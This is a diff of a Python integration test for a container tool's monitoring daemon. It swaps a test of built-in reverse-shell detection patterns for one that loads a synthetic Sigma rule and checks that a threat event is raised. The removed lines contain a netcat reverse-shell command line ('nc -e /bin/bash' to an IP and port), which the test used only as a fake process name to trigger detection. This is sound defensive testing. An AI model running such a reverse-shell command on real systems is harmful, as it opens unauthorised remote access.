@@ -1,9 +1,15 @@
 """
-Integration test: compiled-in exec patterns still fire when no GTFOBins clone exists.
+Integration test: a Sigma DB rule is loaded and matched at runtime.
 
-Counterpart to test_gtfobins_db_pattern_detection: verifies that the absence of
-~/.coi/gtfobins/ does not break detection — the compiled-in defaultExecPatterns in
-internal/monitor/procwatcher.go are used as an automatic fallback.
+Counterpart to test_gtfobins_db_pattern_detection for the Sigma load path
+(internal/monitor/sigma.go), which otherwise has no integration coverage. Sets up
+a synthetic Sigma linux/process_creation rule, starts the monitoring daemon with
+HOME pointing at that clone, execs a process whose command line contains the
+rule's distinctive token, and asserts the daemon raises a threat referencing the
+Sigma rule title.
+
+If this fails, the end-to-end Sigma loading/matching path is broken (the daemon
+is silently ignoring the rules clone).
 """
 
 import hashlib
@@ -13,6 +19,22 @@ import subprocess
 import time
 
 import pytest
+
+# Minimal linux/process_creation rule (level high so it is loaded — see
+# compileSigmaFile, which only keeps high/critical). The distinctive token
+# "coi-sigma-canary-zzz" in CommandLine is what we trigger below.
+_CANARY_RULE = """\
+title: COI Sigma Canary
+id: 00000000-0000-0000-0000-0000000005a1
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection:
+        CommandLine|contains: 'coi-sigma-canary-zzz'
+    condition: selection
+level: high
+"""
 
 
 def _container_name(workspace):
@@ -39,21 +61,15 @@ def _cleanup(name, coi_binary):
     subprocess.run([coi_binary, "container", "delete", name, "--force"], timeout=30, check=False)
 
 
-def test_gtfobins_db_absent_compiled_in_patterns_still_fire(tmp_path, coi_binary):
-    """
-    With no GTFOBins clone the compiled-in nc-exec pattern still detects reverse shells.
-
-    Flow:
-    1. Create <tmp_home>/.coi/config.toml with monitoring enabled — no gtfobins dir
-    2. Start coi shell with HOME=<tmp_home>
-    3. Exec nc -e inside the container (matches compiled-in nc-exec pattern)
-    4. Poll the audit log for a threat event referencing "nc-exec"
-    """
+def test_sigma_db_rule_loaded_and_detected(tmp_path, coi_binary):
+    """A Sigma DB rule triggers a threat event referencing its title."""
     fake_home = tmp_path / "home"
     coi_dir = fake_home / ".coi"
-    coi_dir.mkdir(parents=True)
-    # Deliberately no .coi/gtfobins directory — daemon must fall back to defaults.
+    rules_dir = coi_dir / "sigma" / "rules" / "linux" / "process_creation"
+    rules_dir.mkdir(parents=True)
+    (rules_dir / "canary.yml").write_text(_CANARY_RULE)
 
+    coi_dir.mkdir(parents=True, exist_ok=True)
     (coi_dir / "config.toml").write_text(
         """
 [network]
@@ -104,7 +120,7 @@ process_spawn_rate_threshold = 9999
     # must be established before we exec — otherwise the event is missed.
     time.sleep(3)
 
-    # Matches compiled-in nc-exec pattern: Arg0="nc", Keywords=["-e"].
+    # cmdline contains the rule's CommandLine|contains token → Sigma match.
     subprocess.Popen(
         [
             "incus",
@@ -113,7 +129,7 @@ process_spawn_rate_threshold = 9999
             "--",
             "bash",
             "-c",
-            "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
+            "exec -a 'evilproc coi-sigma-canary-zzz' sleep 30",
         ],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
@@ -133,7 +149,8 @@ process_spawn_rate_threshold = 9999
                     continue
                 if "level" not in ev:
                     continue
-                if "nc-exec" in ev.get("description", ""):
+                text = ev.get("description", "") + ev.get("title", "")
+                if "COI Sigma Canary" in text or "Sigma rule matched" in text:
                     detected = True
                     break
         if detected:
@@ -147,6 +164,6 @@ process_spawn_rate_threshold = 9999
     _cleanup(container_name, coi_binary)
 
     assert detected, (
-        "No threat event referencing 'nc-exec' found in "
-        f"{log_path} — compiled-in fallback patterns may be broken"
+        "No threat event referencing the Sigma canary rule found in "
+        f"{log_path} — the Sigma DB rule was not loaded or not matched"
     )
